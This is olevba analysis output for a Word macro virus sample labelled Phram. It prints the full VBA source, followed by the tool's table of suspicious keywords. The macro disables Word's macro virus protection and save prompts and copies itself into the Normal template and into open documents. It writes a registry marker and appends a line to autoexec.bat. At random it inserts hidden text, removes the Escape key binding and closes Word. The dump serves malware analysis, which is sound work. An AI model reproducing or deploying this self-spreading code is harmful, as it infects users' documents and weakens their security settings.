olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Phram-23a770d03f75cd9d964925341015d51c41b53ade
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Document.cls 
in file: Virus.MSWord.Intended.Phram-23a770d03f75cd9d964925341015d51c41b53ade - OLE stream: 'Macros/VBA/Document'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

































































































Private Sub Document_Open()

'phrame 2000
On Error Resume Next

CommandBars("File").Enabled = True
CommandBars("Tools").Controls("macro").Enabled = True
CommandBars("Help").Enabled = True
Application.EnableCancelKey = 0

Options.VirusProtection = (1 - 1)
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = (1 - 1)
ScreeenUpdate = 0

DisableAutoMacros = 0
ToolsOptionsSave.GlobalDotPrompt = 0
ToolsOptionsSave.AutoSave = 0

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "phrame") <> "phraming the world into the next millenium" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "phrame") = "phraming the world into the next millenium"
End If

Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
    
NTCL = NT.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
    
    BGN = 2
  
If NT.Name <> "ThisDocument" Then
    If NTCL > 0 Then NT.CodeModule.DeleteLines 1, NTCL
    Set ToInfect = NT
    NT.Name = "ThisDocument"
    DoNT = True
End If

If AD.Name <> "Document" Then
    If ADCL > 0 Then AD.CodeModule.DeleteLines 1, ADCL
    Set ToInfect = AD
    AD.Name = "Document"
    DoAD = True
End If

If DoNT <> True And DoAD <> True Then GoTo PhrameEnd

If DoNT = True Then
   ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
   Do While BGN < 99
     ToInfect.CodeModule.InsertLines BGN, AD.CodeModule.Lines(BGN, 1)
     BGN = BGN + 1
   Loop
End If

If DoAD = True Then
   ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
   Do While BGN < 99
     ToInfect.CodeModule.InsertLines BGN, NT.CodeModule.Lines(BGN, 1)
     BGN = BGN + 1
   Loop
End If

PhrameEnd:

Root = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "SystemRoot")
Targ = Mid(Root, 1, 3)

Open Targ + "autoexec.bat" For Append As #1
        Print #1, "pause"
Close #1

Rndnm = Int((Rnd() * 15) + 1)
If Rndnm = 15 Then

    Selection.EndKey Unit:=wdStory
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdWhite
    Selection.TypeText "phraming the world into the next millenium"
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.HomeKey Unit:=wdLine
    Selection.MoveRight Unit:=wdCharacter, Count:=42, Extend:=wdExtend
    Selection.LanguageID = wdNoProofing
    Selection.HomeKey Unit:=wdStory

    ToolsCustomizeKeyboard.KeyCode = 27
    ToolsCustomizeKeyboard.Category = 1
    ToolsCustomizeKeyboard.Name = "Cancel"
    ToolsCustomizeKeyboard.Remove
    ToolsCustomizeKeyboard.Context = 0
    
    SendKeys "%" + "{F4}"

End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

